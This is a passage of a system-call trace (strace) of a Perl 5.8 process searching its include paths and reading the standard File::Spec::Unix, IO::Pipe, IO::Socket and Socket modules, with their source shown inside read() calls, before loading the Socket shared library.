\'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
9851  20:00:43.722390 brk(0x8218000)    = 0x8218000
9851  20:00:43.722590 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
9851  20:00:43.722972 read(8, "", 4096) = 0
9851  20:00:43.722987 close(8)          = 0
9851  20:00:43.723230 read(6, "", 4096) = 0
9851  20:00:43.723279 close(6)          = 0
9851  20:00:43.723450 stat64("/etc/perl/IO/Pipe.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723467 stat64("/etc/perl/IO/Pipe.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723481 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723504 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723520 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723533 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723547 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723559 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723572 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723585 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723603 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.723616 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
9851  20:00:43.723638 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.723653 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.723665 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.723686 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
9851  20:00:43.724358 _llseek(6, 3425, [3425], SEEK_SET) = 0
9851  20:00:43.724389 _llseek(6, 0, [3425], SEEK_CUR) = 0
9851  20:00:43.724400 close(6)          = 0
9851  20:00:43.724424 stat64("/etc/perl/IO/Socket.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724439 stat64("/etc/perl/IO/Socket.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724452 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724465 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724480 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724502 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724517 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724530 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724543 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724555 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724569 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724582 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
9851  20:00:43.724604 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.724618 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.724630 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.724648 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
9851  20:00:43.724974 stat64("/etc/perl/Socket.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.724999 stat64("/etc/perl/Socket.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.725014 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.725027 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.725041 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.725055 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.725069 stat64("/usr/lib/perl5/Socket.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.725082 stat64("/usr/lib/perl5/Socket.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.725095 stat64("/usr/share/perl5/Socket.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.725107 stat64("/usr/share/perl5/Socket.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.725120 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.725133 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
9851  20:00:43.725154 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.725168 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.725179 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.725197 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
9851  20:00:43.725636 brk(0x8239000)    = 0x8239000
9851  20:00:43.725842 read(8, "", 4096) = 0
9851  20:00:43.725857 close(8)          = 0
9851  20:00:43.725944 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
9851  20:00:43.725969 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
9851  20:00:43.726031 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
9851  20:00:43.726047 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
9851  20:00:43.726153 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
9851  20:00:43.726171 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dd5000
9851  20:00:43.726185 mmap2(0xb7dda000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7dda000
9851  20:00:43.726201 close(8)          = 0
9851  20:00:43.726756 brk(0x825a000)    = 0x825a000
9851  20:00:43.726905 stat64("/etc/perl/Errno.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
